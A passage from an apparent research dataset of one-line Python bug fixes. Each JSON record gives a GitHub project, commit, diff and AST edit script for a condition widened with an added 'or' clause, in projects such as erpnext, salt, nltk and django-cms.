\"application/bz2\" : cmd ( cmd = \"bunzip2\" , arg = self . file . name )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 3, 6, 42], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 6, 3, 44], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"application/x-gzip\\\"\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:type\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:file\", \"T\"], 2]]"}
{"project": "LightBuildServer", "commit_sha": "02e32f2dcbba930a0e6ffe89dcbb3f255235ca8a", "parent_sha": "dd385c0af7670ba80ef737615b3b3c1effe9defc", "file_path": "lib/LightBuildServer.py", "project_url": "https://github.com/SolidCharity/LightBuildServer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ class LightBuildServer:\n       stmt += \" AND type <> 'docker'\"\n     if AvoidLXC:\n       stmt += \" AND type <> 'lxc'\"\n-    if SpecificMachine == '':\n+    if SpecificMachine is None or SpecificMachine == '':\n       stmt += \" and static='f'\"\n       cursor = con.execute(stmt)\n     else:\n", "before": "if SpecificMachine == '' : stmt += \" and static='f'\" cursor = con . execute ( stmt ) else : ", "after": "if SpecificMachine is None or SpecificMachine == '' : stmt += \" and static='f'\" cursor = con . execute ( stmt ) else : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 10], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 29], 2], [\"Insert\", \"N1\", [\"identifier:SpecificMachine\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "LightBuildServer", "commit_sha": "cf0e61dd227dec9778e5787d71eb0d9eecf91d7f", "parent_sha": "b2ee33928b287654e9dbb258dd8d0eb3f013f2d2", "file_path": "web/lbs.py", "project_url": "https://github.com/SolidCharity/LightBuildServer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class LightBuildServerWeb:\n         return \"\"\n \n     def checkPermission(self, auth_username, username):\n-        if 'Secret' in self.config['lbs']['Users'][username] and not auth_username == username:\n+        if (username not in self.config['lbs']['Users']) or ('Secret' in self.config['lbs']['Users'][username] and not auth_username == username):\n           return template(\"message\", title=\"Error\", message=\"You don't have the permissions to see this content\", redirect=\"/\")\n         return None\n \n", "before": "if 'Secret' in self . config [ 'lbs' ] [ 'Users' ] [ username ] and not auth_username == username : return template ( \"message\" , title = \"Error\" , message = \"You don't have the permissions to see this content\" , redirect = \"/\" )", "after": "if ( username not in self . config [ 'lbs' ] [ 'Users' ] ) or ( 'Secret' in self . config [ 'lbs' ] [ 'Users' ] [ username ] and not auth_username == username ) : return template ( \"message\" , title = \"Error\" , message = \"You don't have the permissions to see this content\" , redirect = \"/\" )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 95], [\"parenthesized_expression\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 95], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 95], [\"parenthesized_expression\", \"N1\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"comparison_operator\", \"N2\"], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"boolean_operator\", 3, 12, 3, 95], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:username\", \"T\"], 0], [\"Insert\", \"N2\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N2\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N2\", [\"subscript\", \"N3\"], 3], [\"Insert\", \"N3\", [\"subscript\", \"N4\"], 0], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N3\", [\"string:'Users'\", \"T\"], 2], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N4\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N4\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N4\", [\"string:'lbs'\", \"T\"], 2], [\"Insert\", \"N4\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N5\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:config\", \"T\"], 2]]"}
{"project": "openalea", "commit_sha": "5783fc26dc4c1944e8a9bc41e85139618fab902e", "parent_sha": "705c7143bfb24340a1b782c08c2850eb311e16e7", "file_path": "visualea/src/visualea/dataflowview/vertex.py", "project_url": "https://github.com/VirtualPlants/openalea", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -231,7 +231,7 @@ class ObserverOnlyGraphicalVertex(qtgraphview.Vertex,\n     def set_graphical_caption(self, caption):\n         \"\"\"Sets the name displayed in the vertex widget, doesn't change\n         the vertex data\"\"\"\n-        if caption == \"\":\n+        if caption == \"\" or caption == None:\n             caption = \" \"\n         if len(caption)>20 :\n             caption = caption[:20]+\"...\"\n", "before": "if caption == \"\" : caption = \" \"", "after": "if caption == \"\" or caption == None : caption = \" \"", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 26], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 25], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:caption\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "mdapi", "commit_sha": "8514036d9fcd4f1a4a844009c479d48738c19883", "parent_sha": "374083b5de4e3ef543c643ebbdf3dc3cc29fe94f", "file_path": "mdapi/__init__.py", "project_url": "https://github.com/fedora-infra/mdapi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ def _get_pkg(branch, name=None, action=None, srcname=None):\n     ''' Return the pkg information for the given package in the specified\n     branch or raise an aiohttp exception.\n     '''\n-    if not name and not srcname:\n+    if (not name and not srcname) or (name and srcname):\n         raise web.HTTPBadRequest()\n \n     pkg = None\n", "before": "if not name and not srcname : raise web . HTTPBadRequest ( )", "after": "if ( not name and not srcname ) or ( name and srcname ) : raise web . HTTPBadRequest ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 35], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N2\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"not_operator\", 3, 8, 3, 32], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"boolean_operator\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:name\", \"T\"], 0], [\"Insert\", \"N3\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:srcname\", \"T\"], 2]]"}
{"project": "django-cms", "commit_sha": "5d9c84c96bac5aa2b7bf272dfdce3a431f4173f8", "parent_sha": "accefb94a46925f60e0e634edfcb5bcd5b0ffd6d", "file_path": "cms/wizards/wizard_pool.py", "project_url": "https://github.com/FinalAngel/django-cms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ def entry_choices(user, page):\n     for entry in wizard_pool.get_entries():\n-        if entry.user_has_add_permission(user, page=page):\n+        if user.is_superuser or entry.user_has_add_permission(user, page=page):\n             yield (entry.id, entry.title)\n \n \n", "before": "if entry . user_has_add_permission ( user , page = page ) : yield ( entry . id , entry . title )", "after": "if user . is_superuser or entry . user_has_add_permission ( user , page = page ) : yield ( entry . id , entry . title )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 1, 9, 2, 42], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 1, 12, 1, 58], 2], [\"Insert\", \"N1\", [\"identifier:user\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:is_superuser\", \"T\"], 2]]"}
{"project": "cuckoo-modified", "commit_sha": "703517ff129330ff6ae1e65c57c6ee14d12cbb07", "parent_sha": "fddf47aaa0ca9ef1b3b0458bbe838f6cf2f82693", "file_path": "utils/process.py", "project_url": "https://github.com/wbenny/cuckoo-modified", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ def main():\n         maxcount = cfg.cuckoo.max_analysis_count\n         count = 0\n         db = Database()\n-        while count < maxcount:\n+        while count < maxcount or not maxcount:\n             tasks = db.list_tasks(status=TASK_COMPLETED, limit=1)\n \n             for task in tasks:\n", "before": "while count < maxcount : tasks = db . list_tasks ( status = TASK_COMPLETED , limit = 1 ) for task in tasks : ", "after": "while count < maxcount or not maxcount : tasks = db . list_tasks ( status = TASK_COMPLETED , limit = 1 ) for task in tasks : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"while_statement\", 3, 9, 6, 31], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 15, 3, 31], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:maxcount\", \"T\"], 1]]"}
{"project": "egLib", "commit_sha": "144a54b7da4342bdc7a413ccce24affac0a7d11e", "parent_sha": "4c1fa874ce376f08df2a84d35282c0429116b436", "file_path": "scripts/eg_MaterialBuilder3.py", "project_url": "https://github.com/eglaubauf/egLib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -197,7 +197,7 @@ def getFiles():\n     \n     \n         \n-        if \"base_color\" in name.lower():\n+        if \"base_color\" in name.lower() or \"basecolor\" in name.lower():\n             base_color = s\n         elif \"roughness\" in name.lower():\n             roughness = s\n", "before": "if \"base_color\" in name . lower ( ) : base_color = s elif \"roughness\" in name . lower ( ) : roughness = s", "after": "if \"base_color\" in name . lower ( ) or \"basecolor\" in name . lower ( ) : base_color = s elif \"roughness\" in name . lower ( ) : roughness = s", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 26], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 40], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:\\\"basecolor\\\"\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"call\", \"N2\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"identifier:name\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:lower\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"):)\", \"T\"], 1]]"}
{"project": "cuckoo-modified", "commit_sha": "19075290233d85ae5e76d2518c415819de00a39b", "parent_sha": "b517b547a01be952126ecd0334231de457086d02", "file_path": "lib/cuckoo/common/demux.py", "project_url": "https://github.com/wbenny/cuckoo-modified", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -308,7 +308,7 @@ def demux_sample(filename, package, options):\n     magic = File(filename).get_type()\n \n     # if file is an Office doc and password is supplied, try to decrypt the doc\n-    if \"Microsoft\" in magic or \"Composite Document File\" in magic:\n+    if \"Microsoft\" in magic or \"Composite Document File\" in magic or \"CDFV2 Encrypted\" in magic:\n         password = None\n         if \"password=\" in options:\n             fields = options.split(\",\")\n", "before": "if \"Microsoft\" in magic or \"Composite Document File\" in magic : password = None if \"password=\" in options : fields = options . split ( \",\" )", "after": "if \"Microsoft\" in magic or \"Composite Document File\" in magic or \"CDFV2 Encrypted\" in magic : password = None if \"password=\" in options : fields = options . split ( \",\" )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 8, 3, 66], [\"boolean_operator\", 3, 8, 3, 66], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 66], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 66], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"string:\\\"CDFV2 Encrypted\\\"\", \"T\"], 0], [\"Insert\", \"N0\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:magic\", \"T\"], 2]]"}
{"project": "salt", "commit_sha": "5ceac4ca3914905d7b3247b1ce99d874bff2102f", "parent_sha": "8cc43f0cdddceb14686093a87d78349a4cf26e00", "file_path": "salt/modules/inspectlib/collector.py", "project_url": "https://github.com/singlehopllc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -297,7 +297,7 @@ class Inspector(object):\n         for entry_path in [pth for pth in (allowed or os.listdir(\"/\")) if pth]:\n             if entry_path[0] != \"/\":\n                 entry_path = \"/{0}\".format(entry_path)\n-            if entry_path in ignored:\n+            if entry_path in ignored or os.path.islink(entry_path):\n                 continue\n             e_files, e_dirs, e_links = self._get_all_files(entry_path, *ignored)\n             all_files.extend(e_files)\n", "before": "if entry_path in ignored : continue", "after": "if entry_path in ignored or os . path . islink ( entry_path ) : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 25], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 37], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:islink\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:entry_path\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "salt", "commit_sha": "8d75c1b8829d09eb50e3c0b4e9d545d2b7614d21", "parent_sha": "7914f51636c37f7e5dd0b147122323b58f7dcaac", "file_path": "salt/utils/args.py", "project_url": "https://github.com/singlehopllc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -109,7 +109,7 @@ def yamlify_arg(arg):\n             # Only yamlify if it parses into a non-string type, to prevent\n             # loss of content due to # as comment character\n             parsed_arg = yamlloader.load(arg, Loader=yamlloader.SaltYamlSafeLoader)\n-            if isinstance(parsed_arg, string_types):\n+            if isinstance(parsed_arg, string_types) or parsed_arg is None:\n                 return arg\n             return parsed_arg\n         if arg == 'None':\n", "before": "if isinstance ( parsed_arg , string_types ) : return arg", "after": "if isinstance ( parsed_arg , string_types ) or parsed_arg is None : return arg", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 27], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 52], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:parsed_arg\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "django-mptt", "commit_sha": "6500773736f68d1cce7f38cbab29b10a2d9c205f", "parent_sha": "b46e43f1e6485f553481772c4d05af8b47d405f8", "file_path": "mptt/models.py", "project_url": "https://github.com/Flimm/django-mptt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -514,7 +514,7 @@ class MPTTModel(models.Model):\n         self._tree_manager.move_node(self, target, position)\n \n     def _is_saved(self, using=None):\n-        if not self.pk:\n+        if not self.pk or self._mpttfield('tree_id') is None:\n             return False\n         opts = self._meta\n         if opts.pk.rel is None:\n", "before": "if not self . pk : return False", "after": "if not self . pk or self . _mpttfield ( 'tree_id' ) is None : return False", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 23], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 16, 3, 23], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:_mpttfield\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"string:'tree_id'\", \"T\"], 1], [\"Insert\", \"N4\", [\"):)\", \"T\"], 2]]"}
{"project": "restfulie-py", "commit_sha": "955da1b46d1712652914485bd3eb00304b7d3b0d", "parent_sha": "1b7cfbfdecb0232b48a99202456f9d14bbc529e2", "file_path": "restfulie/processor.py", "project_url": "https://github.com/JNRowe-retired/restfulie-py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ class RedirectProcessor(RequestProcessor):\n \n     def execute(self, chain, request, env={}):\n         result = chain.follow(request, env)\n-        if result.code == 201:\n+        if result.code == 201 or result.code == 302:\n             location = result.headers[\"Location\"] or result.headers[\"location\"]\n             if location:\n                 return self.redirect(location)\n", "before": "if result . code == 201 : location = result . headers [ \"Location\" ] or result . headers [ \"location\" ] if location : return self . redirect ( location )", "after": "if result . code == 201 or result . code == 302 : location = result . headers [ \"Location\" ] or result . headers [ \"location\" ] if location : return self . redirect ( location )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 47], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 30], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:302\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:result\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:code\", \"T\"], 2]]"}
{"project": "nltk", "commit_sha": "0b9bec362180f3a718561a193caa36878086cfda", "parent_sha": "912b1575134a2e45abf15a6f006e463df4bd6dd5", "file_path": "nltk/corpus/reader/wordnet.py", "project_url": "https://github.com/uda/nltk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -659,7 +659,7 @@ class Synset(_WordNetObject):\n \n         distance = self.shortest_path_distance(other, simulate_root=simulate_root and need_root)\n \n-        if distance is None or distance < 0:\n+        if distance is None or distance < 0 or depth == 0:\n             return None\n         return -math.log((distance + 1) / (2.0 * depth))\n \n", "before": "if distance is None or distance < 0 : return None", "after": "if distance is None or distance < 0 or depth == 0 : return None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 44], [\"boolean_operator\", 3, 12, 3, 44], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 44], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 44], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:depth\", \"T\"], 0], [\"Insert\", \"N0\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:0\", \"T\"], 2]]"}
{"project": "erpnext", "commit_sha": "40fffc0f4dc3994f635d7652d905fd583b9a3014", "parent_sha": "249bbbc56f96decddc88a92809fd392ccfd2b524", "file_path": "erpnext/stock/doctype/stock_entry/stock_entry.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ class StockEntry(StockController):\n \n \t\t\tfor f in (\"uom\", \"stock_uom\", \"description\", \"item_name\", \"expense_account\",\n \t\t\t\t\"cost_center\", \"conversion_factor\"):\n-\t\t\t\t\tif not item.get(f):\n+\t\t\t\t\tif f not in [\"expense_account\", \"cost_center\"] or not item.get(f):\n \t\t\t\t\t\titem.set(f, item_details.get(f))\n \n \t\t\tif not item.transfer_qty:\n", "before": "if not item . get ( f ) : item . set ( f , item_details . get ( f ) )", "after": "if f not in [ \"expense_account\" , \"cost_center\" ] or not item . get ( f ) : item . set ( f , item_details . get ( f ) )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 6, 4, 39], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"not_operator\", 3, 9, 3, 24], 2], [\"Insert\", \"N1\", [\"identifier:f\", \"T\"], 0], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N1\", [\"list\", \"N2\"], 3], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\"expense_account\\\"\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:\\\"cost_center\\\"\", \"T\"], 3], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 4]]"}
{"project": "erpnext", "commit_sha": "237a871f17787b6a8842a3f3ac1e3efb3072d89a", "parent_sha": "33bc3f3309ba14891bc0f35a07262f28744423cf", "file_path": "erpnext/regional/india/utils.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -5,7 +5,7 @@ from erpnext.regional.india import states, state_numbers\n from erpnext.controllers.taxes_and_totals import get_itemised_tax, get_itemised_taxable_amount\n \n def validate_gstin_for_india(doc, method):\n-\tif not hasattr(doc, 'gstin'):\n+\tif not hasattr(doc, 'gstin') or not doc.gstin:\n \t\treturn\n \n \tdoc.gstin = doc.gstin.upper().strip()\n", "before": "if not hasattr ( doc , 'gstin' ) : return", "after": "if not hasattr ( doc , 'gstin' ) or not doc . gstin : return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 5, 3, 30], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 9, 3, 30], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:doc\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:gstin\", \"T\"], 2]]"}
{"project": "erpnext", "commit_sha": "a3e070bc6b38393fa53e51c08f8500382f2fa0c3", "parent_sha": "3ffe89659a766e2c1256972ecf145fab290e73e0", "file_path": "erpnext/accounts/report/gross_profit/gross_profit.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -171,7 +171,7 @@ class GrossProfitGenerator(object):\n \t\t\t\t\t\t\trow.qty += returned_item_row.qty\n \t\t\t\t\t\t\trow.base_amount += returned_item_row.base_amount\n \t\t\t\t\t\trow.buying_amount = row.qty * row.buying_rate\n-\t\t\t\t\tif row.qty:\n+\t\t\t\t\tif row.qty or row.base_amount:\n \t\t\t\t\t\trow = self.set_average_rate(row)\n \t\t\t\t\t\tself.grouped_data.append(row)\n \n", "before": "if row . qty : row = self . set_average_rate ( row ) self . grouped_data . append ( row )", "after": "if row . qty or row . base_amount : row = self . set_average_rate ( row ) self . grouped_data . append ( row )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 6, 5, 36], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 9, 3, 16], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:row\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:base_amount\", \"T\"], 2]]"}
{"project": "erpnext", "commit_sha": "ac8f4b449d1e56b6c3170b1969b37404199107fd", "parent_sha": "b6ffaf11fe09151de3e10f91fe2b8676cbcf4e5e", "file_path": "erpnext/accounts/doctype/pricing_rule/pricing_rule.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -321,7 +321,7 @@ def set_discount_amount(rate, item_details):\n def remove_pricing_rule_for_item(pricing_rules, item_details, item_code=None):\n \tfrom erpnext.accounts.doctype.pricing_rule.utils import get_apply_on_and_items\n \tfor d in pricing_rules.split(','):\n-\t\tif not d: continue\n+\t\tif not d or not frappe.db.exists(\"Pricing Rule\", d): continue\n \t\tpricing_rule = frappe.get_doc('Pricing Rule', d)\n \n \t\tif pricing_rule.price_or_product_discount == 'Price':\n", "before": "if not d : continue", "after": "if not d or not frappe . db . exists ( \"Pricing Rule\" , d ) : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 6, 3, 11], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:d\", 3, 10, 3, 11], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"call\", \"N2\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:exists\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"string:\\\"Pricing Rule\\\"\", \"T\"], 1], [\"Insert\", \"N4\", [\",:,\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:d\", \"T\"], 3], [\"Insert\", \"N4\", [\"):)\", \"T\"], 4], [\"Insert\", \"N5\", [\"identifier:frappe\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:db\", \"T\"], 2]]"}
